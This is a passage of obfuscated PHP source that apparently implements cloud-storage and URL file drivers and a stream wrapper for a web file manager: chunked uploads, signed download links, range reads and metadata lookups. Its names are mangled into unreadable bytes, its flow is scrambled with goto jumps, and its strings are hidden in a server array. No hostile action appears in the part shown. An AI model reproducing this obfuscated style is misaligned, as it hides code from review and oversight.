0; $FŸœà–ƒ™ = 0; $Eõ¡‘ÔŠÓ¨ = rtrim($aõ›šõ²çº, $f‚Ñ´‚Á¥õ[8]) . $f‚Ñ´‚Á¥õ[8]; goto bš¤ˆ‘ï; a²œ¯ˆÀ°: $f‚Ñ´‚Á¥õ =& $_SERVER[Ö¹ñÒÁ²÷]; $A®‰‘„¼çÆ = $f‚Ñ´‚Á¥õ[33]; $C¹Œ‚áµ = 1000; goto c‚¤—õ°…‹; c ã¬–áÏ: } public function listAll($a¥®ØÈõâ¢) { $eîˆàôàÌ¦ = array(); $this->recursionAllFiles($a¥®ØÈõâ¢, $eîˆàôàÌ¦); return $eîˆàôàÌ¦; } public function canRead($A…ÁãÄ†Öã) { return $this->exist($A…ÁãÄ†Öã) ? !0 : !1; } public function canWrite($E÷°ÂÜó†ª) { return $this->exist($E÷°ÂÜó†ª) ? !0 : !1; } public function getContent($bÕÎš¬®ÍÖ) { return $this->fileSubstr($bÕÎš¬®ÍÖ, 0, -1); } public function setContent($c”©­’íğÚ, $bŸè™…Ëø² = '') { $d‹Åò¼ƒ¶· =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$bŸè™…Ëø²) { $dÎšÁõ™£ = $this->ussRequest($c”©­’íğÚ, $d‹Åò¼ƒ¶·[208]); return $dÎšÁõ™£[$d‹Åò¼ƒ¶·[1026]]; } $cšŸÂ»—Âë = $this->tempFile($this->pathThis($c”©­’íğÚ)); file_put_contents($cšŸÂ»—Âë, $bŸè™…Ëø²); if ($this->upload($c”©­’íğÚ, $cšŸÂ»—Âë)) { $this->tempFileRemve($cšŸÂ»—Âë); return !0; } return !1; } public function fileSubstr($e˜™¸‡£, $F‹Ú„–™ê», $DôÓƒ°Œ‹ã) { $eŞã‚‘„—Œ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!($bªÓä“…æÚ = $this->link($e˜™¸‡£))) { return !1; } $añ…ó¨‰ß  = !1; if ($DôÓƒ°Œ‹ã > 0) { $f‡ùª’ë¾ = $F‹Ú„–™ê» + $DôÓƒ°Œ‹ã - 1; $añ…ó¨‰ß  = array($eŞã‚‘„—Œ[1206] . $F‹Ú„–™ê» . $eŞã‚‘„—Œ[408] . $f‡ùª’ë¾); } $aŸİ²®ÆÌ¨ = url_request($bªÓä“…æÚ, $eŞã‚‘„—Œ[212], !1, $añ…ó¨‰ß ); return $aŸİ²®ÆÌ¨[$eŞã‚‘„—Œ[686]] ? $aŸİ²®ÆÌ¨[$eŞã‚‘„—Œ[1028]] : !1; } public function upload($C‹¨µ¥òƒø, $C¸®ê²çâ, $F×º‘«»ÜÜ = false, $b©Û¿÷®½Æ = REPEAT_REPLACE) { goto eƒ †âØ’ä; aÔ¬Š·Ö: do { $fŞ½¸Šö’˜ = $F˜ŞçŸ½â[$B—Íç¬ğÂõ[1252]]; fseek($CÜÉëâÎŸö, $dõÏÜĞŞÃ); $fÁ™ó·Šê¡ = fread($CÜÉëâÎŸö, $fŞ½¸Šö’˜); $f¼àİ „ÁÚ = 0; do { $f¼àİ „ÁÚ++; $F˜ŞçŸ½â = $this->uploadPart($C‹¨µ¥òƒø, $F˜ŞçŸ½â, $fÁ™ó·Šê¡); } while (!$F˜ŞçŸ½â && $f¼àİ „ÁÚ < 3); if (!$F˜ŞçŸ½â) { return !1; } $a¤°¦÷´ƒ¸ = $F˜ŞçŸ½â[$B—Íç¬ğÂõ[1251]]; $dõÏÜĞŞÃ += $fŞ½¸Šö’˜; } while ($a¤°¦÷´ƒ¸ != -1); fclose($CÜÉëâÎŸö); $d´Š¤Š§¯ˆ = array($B—Íç¬ğÂõ[1253], $B—Íç¬ğÂõ[1254] . $F˜ŞçŸ½â[$B—Íç¬ğÂõ[1255]], $B—Íç¬ğÂõ[1249]); goto cŞ“æ£©›’; e¦”×Ï§©Û: $a¯†’äŒÆÊ = 1024 * 1024 * 10; $d´Š¤Š§¯ˆ = array($B—Íç¬ğÂõ[1247], $B—Íç¬ğÂõ[1248] . $CÜ‹›±Ñ°ç, $B—Íç¬ğÂõ[1249], $B—Íç¬ğÂõ[1250] . $a¯†’äŒÆÊ); $e‘ãÊäÃƒë = $this->ussRequest($C‹¨µ¥òƒø, $B—Íç¬ğÂõ[210], !1, $d´Š¤Š§¯ˆ); goto dÁì‹æùš; eƒ †âØ’ä: $B—Íç¬ğÂõ =& $_SERVER[Ö¹ñÒÁ²÷]; $CÜ‹›±Ñ°ç = IO::size($C¸®ê²çâ); if ($CÜ‹›±Ñ°ç <= 1024 * 1024 * 200) { $A‹‡ğ†Ø›É = array($B—Íç¬ğÂõ[1246] . $C¸®ê²çâ); $e‘ãÊäÃƒë = $this->ussRequest($C‹¨µ¥òƒø, $B—Íç¬ğÂõ[210], $A‹‡ğ†Ø›É); return $e‘ãÊäÃƒë[$B—Íç¬ğÂõ[1026]] ? $this->getPathOuter($C‹¨µ¥òƒø) : !1; } goto e¦”×Ï§©Û; cŞ“æ£©›’: $e‘ãÊäÃƒë = $this->ussRequest($C‹¨µ¥òƒø, $B—Íç¬ğÂõ[210], !1, $d´Š¤Š§¯ˆ); return $e‘ãÊäÃƒë[$B—Íç¬ğÂõ[1026]] ? $this->getPathOuter($eõï¨¼šÄ) : !1; goto CçªÌ“ÙŒ¼; dÁì‹æùš: if (!$e‘ãÊäÃƒë[$B—Íç¬ğÂõ[1026]]) { return !1; } $F˜ŞçŸ½â = $e‘ãÊäÃƒë[$B—Íç¬ğÂõ[1028]]; $dõÏÜĞŞÃ = 0; goto E¡çÚƒ‡˜; E¡çÚƒ‡˜: $a¤°¦÷´ƒ¸ = $F˜ŞçŸ½â[$B—Íç¬ğÂõ[1251]]; $CÜÉëâÎŸö = fopen($C¸®ê²çâ, $B—Íç¬ğÂõ[1156]); if (!$CÜÉëâÎŸö) { return !1; } goto aÔ¬Š·Ö; CçªÌ“ÙŒ¼: } private function uploadPart($dÅ‚íæ‡ÑÕ, $aãßÄƒÆô, &$eâµºœÄë¬) { $c¢•¨–ğƒ‹ =& $_SERVER[Ö¹ñÒÁ²÷]; $eÑó—Á¬Å = array($c¢•¨–ğƒ‹[1256], $c¢•¨–ğƒ‹[1254] . $aãßÄƒÆô[$c¢•¨–ğƒ‹[1255]], $c¢•¨–ğƒ‹[1257] . $aãßÄƒÆô[$c¢•¨–ğƒ‹[1251]], $c¢•¨–ğƒ‹[1258] . $aãßÄƒÆô[$c¢•¨–ğƒ‹[1252]]); $FÊƒàŸïÏ = $this->ussRequest($dÅ‚íæ‡ÑÕ, $c¢•¨–ğƒ‹[210], $eâµºœÄë¬, $eÑó—Á¬Å); return !$FÊƒàŸïÏ[$c¢•¨–ğƒ‹[1026]] ? $FÊƒàŸïÏ[$c¢•¨–ğƒ‹[1026]] : $FÊƒàŸïÏ[$c¢•¨–ğƒ‹[1028]]; } public function uploadFormData($b›ùŒì…Ÿ, $c…³Ş›¿Ğ = 3600) { return $this->uploadPolicy($b›ùŒì…Ÿ, $c…³Ş›¿Ğ); } public function multiUploadFormData($D“š¹ÈÇ—, $A•êò¥ç¾ï = 3600) { $BÎºµ§œÕÂ =& $_SERVER[Ö¹ñÒÁ²÷]; $cË¤“²˜§‹ = (int) $GLOBALS[$BÎºµ§œÕÂ[7]][$BÎºµ§œÕÂ[77]]; return $this->uploadPolicy($D“š¹ÈÇ—, $A•êò¥ç¾ï, $cË¤“²˜§‹); } private function uploadPolicy($C¢êİœò²ê, $aãÚéÂíë­ = 3600, $A£Şœ«ß = 0) { goto CÃÆ‘ª¡–; AÙ–Éšæ–•: $D²Ê´æÕµ = base64_encode(hash_hmac($cï™ÔˆÖÜí[1228], "\120\x4f\123\124\46{$AÛ¤‚¦›îŞ}\x26{$Dï£ë‚Á¨÷}\x26{$dóâ¶ÔÑ¿}", md5("{$this->userpass}"), !0)); $a£Ùîó­‰Õ = array($cï™ÔˆÖÜí[1099] => $dóâ¶ÔÑ¿, $cï™ÔˆÖÜí[1263] => "\x55\120\x59\125\x4e\40{$this->username}\x3a{$D²Ê´æÕµ}", $cï™ÔˆÖÜí[165] => $this->endpoint . $AÛ¤‚¦›îŞ); return $a£Ùîó­‰Õ; goto E¥˜•Üî˜“; CÃÆ‘ª¡–: $cï™ÔˆÖÜí =& $_SERVER[Ö¹ñÒÁ²÷]; $AÛ¤‚¦›îŞ = $cï™ÔˆÖÜí[8] . $this->bucket; $Dï£ë‚Á¨÷ = gmdate($cï™ÔˆÖÜí[1191]); goto F¨‘óÓé´½; F¨‘óÓé´½: $aÌŸÕäÕçË = array($cï™ÔˆÖÜí[1259] => $this->bucket, $cï™ÔˆÖÜí[1260] => $C¢êİœò²ê, $cï™ÔˆÖÜí[1261] => time() + $aãÚéÂíë­, $cï™ÔˆÖÜí[1262] => $Dï£ë‚Á¨÷); if ($A£Şœ«ß) { $aÌŸÕäÕçË[$cï™ÔˆÖÜí[1177]] = $A£Şœ«ß; } $dóâ¶ÔÑ¿ = base64_encode(json_encode($aÌŸÕäÕçË)); goto AÙ–Éšæ–•; E¥˜•Üî˜“: } public function download($Cã…öß®ÅÊ, $E¬ŞÈ†½õË) { goto báÉÄ˜ê²ã; C¾à‰…Øõç: fclose($dÓ›È´’); return $E¬ŞÈ†½õË; goto DéĞùî‹ÓÍ; B¿Ô©¶Ì¾: $AŒ½–ÛÙ¯Ú = 1024 * 200; $dÓ›È´’ = fopen($c†Ÿ°‚‹Ó“, $_SERVER[Ö¹ñÒÁ²÷][1212]); while (!0) { $C Ê„Ë’³ = $this->fileSubstr($Cã…öß®ÅÊ, $F»‹Œõ±Ïè, $AŒ½–ÛÙ¯Ú); if ($C Ê„Ë’³ === !1) { return !1; } fwrite($dÓ›È´’, $C Ê„Ë’³); $F»‹Œõ±Ïè += $AŒ½–ÛÙ¯Ú; if (strlen($C Ê„Ë’³) < $AŒ½–ÛÙ¯Ú) { break; } } goto C¾à‰…Øõç; báÉÄ˜ê²ã: $c†Ÿ°‚‹Ó“ = IO::getPathInner(IO::mkfile($E¬ŞÈ†½õË)); if (!($cùáß¸Àº = $this->link($Cã…öß®ÅÊ))) { return !1; } $F»‹Œõ±Ïè = 0; goto B¿Ô©¶Ì¾; DéĞùî‹ÓÍ: } public function link($E“ãÇïŒ†„, $F¥œµ†µ· = array()) { $B¨˜…ˆµ” =& $_SERVER[Ö¹ñÒÁ²÷]; $E“ãÇïŒ†„ = trim($E“ãÇïŒ†„, $B¨˜…ˆµ”[8]); if (!empty($this->token)) { $C¤×¸Ìñõ¾ = strtotime(date($B¨˜…ˆµ”[1264])); $EÄ«â¡òÆ = substr(md5($this->token . $B¨˜…ˆµ”[268] . $C¤×¸Ìñõ¾ . $B¨˜…ˆµ”[1265] . $E“ãÇïŒ†„), 12, 8) . $C¤×¸Ìñõ¾; $F¥œµ†µ·[] = $B¨˜…ˆµ”[1266] . $EÄ«â¡òÆ; } $aÉ‡ÆÉË² = !empty($F¥œµ†µ·) ? $B¨˜…ˆµ”[69] . implode($B¨˜…ˆµ”[268], $F¥œµ†µ·) : $B¨˜…ˆµ”[33]; return $this->getHost() . $B¨˜…ˆµ”[8] . $E“ãÇïŒ†„ . $aÉ‡ÆÉË²; } public function fileOut($CÉçà×ˆòÄ, $eÆ¹óŠÒµ° = false, $d«¹ß¯„Š = false, $Bªõòï­í‰ = '') { if (!$d«¹ß¯„Š) { $d«¹ß¯„Š = $this->pathThis($CÉçà×ˆòÄ); } $c‡ñÕ·‰Ï³ = $eÆ¹óŠÒµ° ? array($_SERVER[Ö¹ñÒÁ²÷][1267] . rawurlencode($d«¹ß¯„Š)) : array(); $dŞåÜ†¤Öå = $this->link($CÉçà×ˆòÄ, $c‡ñÕ·‰Ï³); $this->fileOutLink($dŞåÜ†¤Öå); } public function fileOutServer($B‰™ÆÊ­•Ã, $F¼ì»Âˆ‰ = false, $Fî —ÚÙ²± = false, $BòÑ«×°Åº = '') { parent::fileOut($B‰™ÆÊ­•Ã, $F¼ì»Âˆ‰, $Fî —ÚÙ²±, $BòÑ«×°Åº); } public function fileOutImage($c·´…¥åØ¨, $dÔğÙîĞó = 250) { $FÛäÔÏïæ = $this->link($c·´…¥åØ¨ . $_SERVER[Ö¹ñÒÁ²÷][1268] . $dÔğÙîĞó); $this->fileOutLink($FÛäÔÏïæ); } public function fileOutImageServer($càÍèÇÖîì, $bÕ¨†İè³Ò = 250) { parent::fileOutImage($càÍèÇÖîì, $bÕ¨†İè³Ò); } public function hashMd5($c®»Ñ”¤ïĞ) { $CÚĞô¹½ =& $_SERVER[Ö¹ñÒÁ²÷]; $eÆÂâÁæ˜­ = $this->objectMeta($c®»Ñ”¤ïĞ); return isset($eÆÂâÁæ˜­[$CÚĞô¹½[192]]) ? $eÆÂâÁæ˜­[$CÚĞô¹½[192]] : !1; } public function size($DàÑ”Ô¡º³) { $F™ŠƒÆ¼§Š = $this->objectMeta($DàÑ”Ô¡º³); return $F™ŠƒÆ¼§Š ? $F™ŠƒÆ¼§Š[$_SERVER[Ö¹ñÒÁ²÷][77]] : 0; } public function info($E‚ã¢×Òªª) { if ($this->isFolder($E‚ã¢×Òªª)) { return $this->folderInfo($E‚ã¢×Òªª); } else { if ($this->isFile($E‚ã¢×Òªª)) { return $this->fileInfo($E‚ã¢×Òªª); } } return !1; } public function exist($eËê¯Š¸†§) { return $this->isFile($eËê¯Š¸†§) || $this->isFolder($eËê¯Š¸†§); } public function isFile($EÁ…»Ÿ­¤¶) { return !$this->isFolder($EÁ…»Ÿ­¤¶) && $this->objectMeta($EÁ…»Ÿ­¤¶); } public function isFolder($B™Ì‚·‰) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][219], $B™Ì‚·‰); } protected function objectMeta($D®‚›Íë®Ï) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][220], $D®‚›Íë®Ï); } protected function _objectMeta($C‡ğé¦í”) { goto a§îª¥ºã‡; a§îª¥ºã‡: $dë…ÈÁÏï =& $_SERVER[Ö¹ñÒÁ²÷]; if ($C‡ğé¦í” == $dë…ÈÁÏï[33] || $C‡ğé¦í” == $dë…ÈÁÏï[8]) { return array(); } $a×‚«Ùä½ = $this->ussRequest($C‡ğé¦í”, $dë…ÈÁÏï[1269]); goto aê“¨©Ç–×; aê“¨©Ç–×: if (!$a×‚«Ùä½[$dë…ÈÁÏï[1026]]) { return null; } $cÂÑš¼¿ªÓ = isset($a×‚«Ùä½[$dë…ÈÁÏï[1028]]) ? $a×‚«Ùä½[$dë…ÈÁÏï[1028]] : array(); if (!isset($cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1270]])) { return null; } goto Bƒ¥¹ÇÆ¶‡; Bƒ¥¹ÇÆ¶‡: $FÅÄÅÛÖš = array($dë…ÈÁÏï[28] => get_path_this($C‡ğé¦í”), $dë…ÈÁÏï[29] => isset($cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1270]]) ? $cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1270]] : null, $dë…ÈÁÏï[77] => isset($cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1271]]) ? $cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1271]] : null, $dë…ÈÁÏï[192] => isset($cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1272]]) ? $cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1272]] : null, $dë…ÈÁÏï[1239] => isset($cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1273]]) ? $cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1273]] : null); $FÅÄÅÛÖš[$dë…ÈÁÏï[1240]] = isset($cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1274]]) ? strtotime($cÂÑš¼¿ªÓ[$dë…ÈÁÏï[1274]]) : $FÅÄÅÛÖš[$dë…ÈÁÏï[1239]]; return $FÅÄÅÛÖš; goto c»¥æÎÒêÊ; c»¥æÎÒêÊ: } protected function _isFolder($CÎÚ¢‡Æ“Á) { $D²Á™‚÷² =& $_SERVER[Ö¹ñÒÁ²÷]; if ($CÎÚ¢‡Æ“Á == $D²Á™‚÷²[33] || $CÎÚ¢‡Æ“Á == $D²Á™‚÷²[8]) { return !0; } $F™—‰è†Ÿ = $this->objectMeta($CÎÚ¢‡Æ“Á); return isset($F™—‰è†Ÿ[$D²Á™‚÷²[29]]) && $F™—‰è†Ÿ[$D²Á™‚÷²[29]] == $D²Á™‚÷²[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Bùå°Æ¹„— = false) { } public function exist($B¨Û¬÷Øâ) { $BôÂÁŠ¶ª§ = $this->info($B¨Û¬÷Øâ); return $BôÂÁŠ¶ª§[$_SERVER[Ö¹ñÒÁ²÷][184]]; } public function isFile($DŸµ³­òº²) { $e©•ö ¿‰œ = $this->info($DŸµ³­òº²); return $e©•ö ¿‰œ[$_SERVER[Ö¹ñÒÁ²÷][184]]; } public function isFolder($fŠëÆ×šÊ˜) { return !1; } public function size($D±ã¹£©Ğ) { $DÌá¦õ²·¹ = $this->info($D±ã¹£©Ğ); return $DÌá¦õ²·¹[$_SERVER[Ö¹ñÒÁ²÷][77]]; } public function info($aÑ—Òö–Ë) { return $this->infoParse($aÑ—Òö–Ë); } public function infoAuth($D‰—£·Š¾) { return $this->infoParse($D‰—£·Š¾); } public function infoWithChildren($eäª¾ŸñÃ) { return $this->infoParse($eäª¾ŸñÃ); } public function infoFull($B¥Â¡Ù›À®) { return $this->infoParse($B¥Â¡Ù›À®); } private function infoParse($BÄäĞˆŠÇÆ) { $BÅ±²’¤Œ =& $_SERVER[Ö¹ñÒÁ²÷]; $aÏ»æíšâ = $this->header($BÄäĞˆŠÇÆ); if (!$aÏ»æíšâ || !$aÏ»æíšâ[$BÅ±²’¤Œ[686]]) { return !1; } $D ÁÎ‚›í = _get($aÏ»æíšâ, $BÅ±²’¤Œ[321], 0); $D÷·¬Şğî‚ = array($BÅ±²’¤Œ[28] => $aÏ»æíšâ[$BÅ±²’¤Œ[28]], $BÅ±²’¤Œ[75] => $BÄäĞˆŠÇÆ, $BÅ±²’¤Œ[29] => $BÅ±²’¤Œ[163], $BÅ±²’¤Œ[77] => intval($D ÁÎ‚›í), $BÅ±²’¤Œ[156] => get_path_ext($aÏ»æíšâ[$BÅ±²’¤Œ[28]]), $BÅ±²’¤Œ[1148] => $D ÁÎ‚›í > 0 && $aÏ»æíšâ[$BÅ±²’¤Œ[1275]], $BÅ±²’¤Œ[1149] => !1); return $D÷·¬Şğî‚; } private function header($Fñì¬ÙïŠ‚) { if (isset(self::$_cacheHeader[$Fñì¬ÙïŠ‚])) { return self::$_cacheHeader[$Fñì¬ÙïŠ‚]; } self::$_cacheHeader[$Fñì¬ÙïŠ‚] = url_header($Fñì¬ÙïŠ‚); return self::$_cacheHeader[$Fñì¬ÙïŠ‚]; } public function hashSimple($EÎÀ†ê¢Ü‘, $C°Ê»ïŒ÷¶ = false) { goto Aùö¾ª¡ä£; Aùö¾ª¡ä£: $fµÎ†Öëô¹ =& $_SERVER[Ö¹ñÒÁ²÷]; $f‡‡Õõö = $this->info($EÎÀ†ê¢Ü‘); if (!$f‡‡Õõö || !$f‡‡Õõö[$fµÎ†Öëô¹[184]]) { return !1; } goto c’²ó²Ã¤¤; A‡õªÏÊ¦±: $Eƒ¬¥§˜ä = timeFloat(); $AğŠ‹Šæ÷ = 15; for ($DóÑÂ•Á» = 0; $DóÑÂ•Á» < $FŸÊ…˜ªÃÂ; $DóÑÂ•Á»++) { if (timeFloat() - $Eƒ¬¥§˜ä > $AğŠ‹Šæ÷) { return !1; } $c»â«Ëµ = $this->fileSubstr($EÎÀ†ê¢Ü‘, $eõ •â‚Ğ * $DóÑÂ•Á», $e©àŠØÜÊÒ); if (!$c»â«Ëµ) { return !1; } $D½ˆ”“›À‰ .= $c»â«Ëµ; } goto d©å«ùîñâ; c’²ó²Ã¤¤: $e–…–¥¼š² = $f‡‡Õõö[$fµÎ†Öëô¹[77]]; $e©àŠØÜÊÒ = 200; $FŸÊ…˜ªÃÂ = 50; goto BƒëĞæ¥‰ä; d©å«ùîñâ: $D½ˆ”“›À‰ .= $this->fileSubstr($EÎÀ†ê¢Ü‘, $e–…–¥¼š² - $e©àŠØÜÊÒ, $e©àŠØÜÊÒ); return md5($D½ˆ”“›À‰) . $e–…–¥¼š²; goto DíËóĞÅ§; BƒëĞæ¥‰ä: if ($e–…–¥¼š² <= $e©àŠØÜÊÒ * $FŸÊ…˜ªÃÂ) { return md5($this->fileSubstr($EÎÀ†ê¢Ü‘, 0, $e–…–¥¼š²)) . $e–…–¥¼š²; } $eõ •â‚Ğ = intval($e–…–¥¼š² / $FŸÊ…˜ªÃÂ); $D½ˆ”“›À‰ = $fµÎ†Öëô¹[33]; goto A‡õªÏÊ¦±; DíËóĞÅ§: } public function getContent($e«•„á¨¶¡) { return $this->fileSubstr($e«•„á¨¶¡); } public function fileSubstr($Eù‰¾ÉÄ¯ó, $DËºé×¼Í” = 0, $eÊ‰ëöôğõ = -1) { goto fæê–ªÕêí; fæê–ªÕêí: $D·„ø¼½ß¨ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÍ«Ü§áË’ = $this->info($Eù‰¾ÉÄ¯ó); if (!$bÍ«Ü§áË’ || !$bÍ«Ü§áË’[$D·„ø¼½ß¨[184]] && $bÍ«Ü§áË’[$D·„ø¼½ß¨[77]] > 1024 * 1024 * 10) { return !1; } goto dİ¢à³ô‚¼; dİ¢à³ô‚¼: if ($eÊ‰ëöôğõ === -1) { $eÊ‰ëöôğõ = $bÍ«Ü§áË’[$D·„ø¼½ß¨[77]]; } if ($eÊ‰ëöôğõ == 0) { return $D·„ø¼½ß¨[33]; } $EÛÌ‰ÍÉš¢ = array($D·„ø¼½ß¨[1276] . $DËºé×¼Í” . $D·„ø¼½ß¨[711] . ($DËºé×¼Í” + $eÊ‰ëöôğõ - 1)); goto D„¡‚ç¥¼‰; D„¡‚ç¥¼‰: $eÂ‰¡ƒá = url_request($Eù‰¾ÉÄ¯ó, $D·„ø¼½ß¨[212], !1, $EÛÌ‰ÍÉš¢, !1, !1, 1); return $eÂ‰¡ƒá[$D·„ø¼½ß¨[1028]] ? $eÂ‰¡ƒá[$D·„ø¼½ß¨[1028]] : $D·„ø¼½ß¨[33]; goto BÃì‚˜Çö; BÃì‚˜Çö: } public function download($aˆôíä‘„°, $E¡³¸ É°Ã) { Downloader::start($aˆôíä‘„°, $E¡³¸ É°Ã); return $E¡³¸ É°Ã; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($E…‚Û„—½†, $A •æµ¡§· = '') { goto Dæùä–ì¾; bÒõã“ìãõ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$E…‚Û„—½†])) { self::$_chunkBuffer[$E…‚Û„—½†] = array(); } goto eÆ–‡·âõ; eÆ–‡·âõ: return $this->info ? !0 : !1; goto AõæáÑ“Ú; Dæùä–ì¾: $this->info = $this->info($E…‚Û„—½†); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ö¹ñÒÁ²÷][75]]; goto bÒõã“ìãõ; AõæáÑ“Ú: } function stream_read($d¸ÜŒ³ò™) { $DÂÈçÀ÷¸ƒ = $this->fileSubstr($this->pose, $d¸ÜŒ³ò™); $this->pose += strlen($DÂÈçÀ÷¸ƒ); return $DÂÈçÀ÷¸ƒ; } public function stream_tell() { return $this->pose; } public function stream_seek($D—¯•·’Ñµ, $e¥¼£÷àÓ«) { $d¿¹ˆŸ¯Ùå =& $_SERVER[Ö¹ñÒÁ²÷]; if ($e¥¼£÷àÓ« == SEEK_SET) { $this->pose = $D—¯•·’Ñµ; } else { if ($e¥¼£÷àÓ« == SEEK_CUR) { $this->pose += $D—¯•·’Ñµ; } else { if ($e¥¼£÷àÓ« == SEEK_END) { $this->pose = $this->info[$d¿¹ˆŸ¯Ùå[77]] + intval($D—¯•·’Ñµ); } } } if ($D—¯•·’Ñµ < 0) { $this->pose = $this->info[$d¿¹ˆŸ¯Ùå[77]] + $D—¯•·’Ñµ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ö¹ñÒÁ²÷][77]]; } public function stream_close() { return !0; } public function url_stat($bÛøôööÄ, $bÛ¹ºÈ«Äá) { $Båƒíâ”ãİ =& $_SERVER[Ö¹ñÒÁ²÷]; $c‡Š»§ö÷« = $this->info($bÛøôööÄ); return array($Båƒíâ”ãİ[1277] => 0, $Båƒíâ”ãİ[1278] => 0, $Båƒíâ”ãİ[12] => 32768 + 511, $Båƒíâ”ãİ[1279] => 0, $Båƒíâ”ãİ[1280] => 0, $Båƒíâ”ãİ[1281] => 0, $Båƒíâ”ãİ[1282] => 0, $Båƒíâ”ãİ[77] => $c‡Š»§ö÷«[$Båƒíâ”ãİ[77]], $Båƒíâ”ãİ[1283] => $c‡Š»§ö÷«[$Båƒíâ”ãİ[1154]], $Båƒíâ”ãİ[1240] => $c‡Š»§ö÷«[$Båƒíâ”ãİ[106]], $Båƒíâ”ãİ[1239] => $c‡Š»§ö÷«[$Båƒíâ”ãİ[183]], $Båƒíâ”ãİ[1284] => 0, $Båƒíâ”ãİ[1285] => 0); } static $fileInfo = array(); public function info($eø¿¶Å¤Ä­) { $dÛ’´ùØÒ = $_SERVER[Ö¹ñÒÁ²÷][1286]; if (isset(self::$fileInfo[$eø¿¶Å¤Ä­])) { return self::$fileInfo[$eø¿¶Å¤Ä­]; } if (substr($eø¿¶Å¤Ä­, 0, strlen($dÛ’´ùØÒ)) != $dÛ’´ùØÒ) { return !1; } self::$fileInfo[$eø¿¶Å¤Ä­] = IO::info(substr($eø¿¶Å¤Ä­, strlen($dÛ’´ùØÒ))); return self::$fileInfo[$eø¿¶Å¤Ä­]; } public static function read($a†µÈ, $F–¾¹ğŒ†, $cõ†ù‚ßÏé) { goto f–Ö›èÑ¿Ú; CƒĞà™Ü×: $AÁöïğìêÀ = 8192; fseek($dŠƒ×µ£Åå, $F–¾¹ğŒ†, SEEK_SET); $A»•—ñ…‚ª = $cø˜Õæè—[33]; goto bğ¼”Åó¼; f–Ö›èÑ¿Ú: $cø˜Õæè— =& $_SERVER[Ö¹ñÒÁ²÷]; $dŠƒ×µ£Åå = fopen($a†µÈ, $cø˜Õæè—[1156]); if (!$dŠƒ×µ£Åå) { return $cø˜Õæè—[33]; } goto CƒĞà™Ü×; Bğ‚™§ö¶ù: return $A»•—ñ…‚ª; goto cË®è“êÉ; bğ¼”Åó¼: $Aè‘éĞã¬ = 0; while ($Aè‘éĞã¬ < $cõ†ù‚ßÏé) { $cÅÄ“¾­ = min($AÁöïğìêÀ, $cõ†ù‚ßÏé - $Aè‘éĞã¬); $A»•—ñ…‚ª .= fread($dŠƒ×µ£Åå, $cÅÄ“¾­); $Aè‘éĞã¬ += $cÅÄ“¾­; } fclose($dŠƒ×µ£Åå); goto Bğ‚™§ö¶ù; cË®è“êÉ: } public function fileSubstr($C ÌŸ“­ëØ, $c§á°™¯‡§) { goto a³¼ˆŸƒÁ¯; BºòÜ²Ü˜: $cƒ¶¿Áß² = $c§á°™¯‡§; if ($C ÌŸ“­ëØ < 0) { $C ÌŸ“­ëØ = $CÉäª´Øù‹ + $C ÌŸ“­ëØ; } if ($c§á°™¯‡§ === !1) { $c§á°™¯‡§ = $CÉäª´Øù‹ - $C ÌŸ“­ëØ; } goto e„ƒ×ÄÅÇë; Bí„éÚó÷Ø: foreach ($DØ°„Àìƒ as $B¢Ù‘çÆ´ => $CˆàÆ‚”ì…) { $B¢Ù‘çÆ´ = intval($B¢Ù‘çÆ´); $E¡œ˜‡ßÊ± = $B¢Ù‘çÆ´ + strlen($CˆàÆ‚”ì…); if ($C ÌŸ“­ëØ >= $E¡œ˜‡ßÊ±) { continue; } if ($C ÌŸ“­ëØ >= $B¢Ù‘çÆ´ && $C ÌŸ“­ëØ + $c§á°™¯‡§ <= $E¡œ˜‡ßÊ±) { return substr($CˆàÆ‚”ì…, $C ÌŸ“­ëØ - $B¢Ù‘çÆ´, $c§á°™¯‡§); } break; } if (count($DØ°„Àìƒ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($e©ÇÓî­Ë[1287], $e©ÇÓî­Ë[1288] . count($DØ°„Àìƒ) . "\73\x73\164\x61\162\x74\75{$C ÌŸ“­ëØ}\x2c\154\145\x6e\x67\x74\x68\x3d{$c§á°™¯‡§}\73\160\x6f\x73\145\72{$B¢Ù‘çÆ´}\x7e{$E¡œ˜‡ßÊ±}"); throw new Exception($e©ÇÓî­Ë[1289]); } $AÌŒ™£¥Ü = intval($C ÌŸ“­ëØ / $E–‘ëñÆíá) * $E–‘ëñÆíá; goto cÎ±„÷¿õæ; a³¼ˆŸƒÁ¯: $e©ÇÓî­Ë =& $_SERVER[Ö¹ñÒÁ²÷]; $CÉäª´Øù‹ = $this->info[$e©ÇÓî­Ë[77]]; $Fö„™™Ò‘ = $C ÌŸ“­ëØ; goto BºòÜ²Ü˜; A¦«ôÀ¡µ±: $B¢Ù‘çÆ´ = 0; $E¡œ˜‡ßÊ± = 0; $CˆàÆ‚”ì… = $e©ÇÓî­Ë[33]; goto Bí„éÚó÷Ø; AóîÙÛ©¦: ksort($DØ°„Àìƒ); $CªÏåô‚æò = substr($f˜±ØùŒÅ†, $C ÌŸ“­ëØ - $AÌŒ™£¥Ü, $c§á°™¯‡§); return $CªÏåô‚æò; goto BÇ™Œ‚³ç; cÎ±„÷¿õæ: $D‚¢ÇƒéÒ¶ = ceil(($C ÌŸ“­ëØ + $c§á°™¯‡§) / $E–‘ëñÆíá) * $E–‘ëñÆíá - 